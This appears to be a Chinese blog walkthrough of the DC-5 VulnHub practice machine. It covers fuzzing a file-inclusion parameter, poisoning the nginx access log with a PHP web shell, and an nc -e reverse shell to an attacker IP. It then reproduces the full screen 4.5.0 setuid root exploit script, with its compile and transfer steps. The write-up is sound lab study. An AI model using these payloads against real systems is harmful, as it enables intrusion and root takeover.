---
title: DC_5靶机渗透测试 
date: 2020-09-14 14:06
swiper: false # 将改文章放入轮播图中
swiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片
img: 'http://cdn.mxrblog.cn/ct_3.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片
categories: 渗透测试
tags: [渗透测试, DC]   # 可以是数组
top: false


---

# DC_5靶机渗透测试



[参考链接1](https://www.cnblogs.com/wzy-ustc/p/14606475.html)

[参考链接2](https://blog.mzfr.me/vulnhub-writeups/2019-07-09-DC5)



## 信息收集

- 首先扫描出靶机， IP为192.168.0.149

![image-20210701112058852](http://cdn.mxrblog.cn/image-20210701112058852.png)

- 扫描靶机开放端口, 开放80端口

![image-20210701112246220](http://cdn.mxrblog.cn/image-20210701112246220.png)

- 浏览器打开192.168.0.149

![image-20210701112421282](http://cdn.mxrblog.cn/image-20210701112421282.png)

- 用dirb和dirbuster分别进行目录扫描

![image-20210701114840558](http://cdn.mxrblog.cn/image-20210701114840558.png)

- 啥也没有， 尝试在contact us页面提交一些内容

![image-20210701115231365](http://cdn.mxrblog.cn/image-20210701115231365.png)

- 都能传东西了。可能存在一些文件包含漏洞吧，利用brupsuite查看信息

![image-20210701125839801](http://cdn.mxrblog.cn/image-20210701125839801.png)

- 寻找可以包含参数的文件变量名——使用工具wfuzz

```
wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.0.149/thankyou.php?FUZZ=/etc/passwd  //FUZZ后面接被包含的文件
```

- 可以拿到与众不同的file文件，由于参数传进去了，自然就不一样了

![image-20210701150356952](http://cdn.mxrblog.cn/image-20210701150356952.png)

- 之前通过扫描知道了该靶机的网络服务器是nginx，Google搜素后发现nginx的日志文件可以在其配置文件/etc/nginx/nginx.config中找到, 于是我们修改file的参数为配置文件路径

![image-20210702002453469](http://cdn.mxrblog.cn/image-20210702002453469.png)

- 发现两个可以被利用的配置文件：

```
access_log:   /var/log/nginx/access.log
error_log:    /var/log/nginx/error.log
```

- 我们利用配置文件access_log， 在配置文件中写入木马：

```
<?php system($_GET['shell']);?>  //shell为参数可以被任意的修改

/var/log/nginx/access.log&shell=nc -e /bin/sh 192.168.0.130 4444  //nc向攻击机器·上发送shell
```

![image-20210702011941956](http://cdn.mxrblog.cn/image-20210702011941956.png)



- 在攻击机器上监听本地4444端口

![image-20210702012135051](http://cdn.mxrblog.cn/image-20210702012135051.png)

- 使用python脚本获取交互式shell

```
python -c "import pty;pty.spawn('/bin/bash')"
```

![image-20210702012623598](http://cdn.mxrblog.cn/image-20210702012623598.png)

- 发现我们只是普通用户，无法查看/home/dc中的内容，的想办法来提权
- 先查看可以提权的文件：

```
find / -perm -u=s -type f 2> /dev/null
```

![image-20210702013130321](http://cdn.mxrblog.cn/image-20210702013130321.png)

- 搜索一下screen-4.5.0，发现存在漏洞， 并找到所在的路径

![image-20210702015034118](http://cdn.mxrblog.cn/image-20210702015034118.png)

- 查看41154.sh

![image-20210702015722294](http://cdn.mxrblog.cn/image-20210702015722294.png)

- 按照上面说的一步一步来

```
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell 

```

- 首先在攻击机器上先编译好，然后再在攻击机器上开启http服务，将编辑好的文件传到靶机
- 在宿主机上分别执行以下命令：

```
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
```

- 得到文件后在文件所在目录开启http服务，如果不在文件所在的地方开启服务就会导致靶机显示找不到文件

```
python -m SimpleHTTPServer 9000
```

- 在靶机的/tmp文件夹使用wget下载文件，注意一定要在/tmp目录下载，一方面待会的行动会从/tmp目录下读取，更重要的是在/www/html目录下，无法下载文件，会显示无权限写入文件，这是因为/www/html目录的写入是需要root用户权限的

![image-20210702034418648](http://cdn.mxrblog.cn/image-20210702034418648.png)

- 让我们来执行接下来的步骤

![image-20210702034616197](http://cdn.mxrblog.cn/image-20210702034616197.png)

- 得到权限后进入root目录下

![image-20210702034740792](http://cdn.mxrblog.cn/image-20210702034740792.png)



### 太难了我！！！

